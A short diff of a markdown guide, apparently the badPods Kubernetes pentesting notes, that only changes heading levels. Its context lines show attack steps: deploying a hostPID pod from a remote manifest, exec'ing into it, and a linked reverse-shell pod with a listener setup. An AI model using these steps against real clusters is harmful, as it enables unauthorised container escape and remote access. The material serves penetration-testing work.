@@ -5,7 +5,7 @@ You are exploiting the fact that there are no polices preventing the creation of
 
 # Pod Creation
 
-### Create a pod you can exec into
+## Create a pod you can exec into
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -43,7 +43,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/h
 kubectl -n [namespace] exec -it pod-hostpid-only -- bash
 ```
 
-### Or, create a reverse shell pod
+## Or, create a reverse shell pod
 [pod-hostpid-only-revshell.yaml](pod-hostpid-only-revshell.yaml)
 
 #### Set up listener
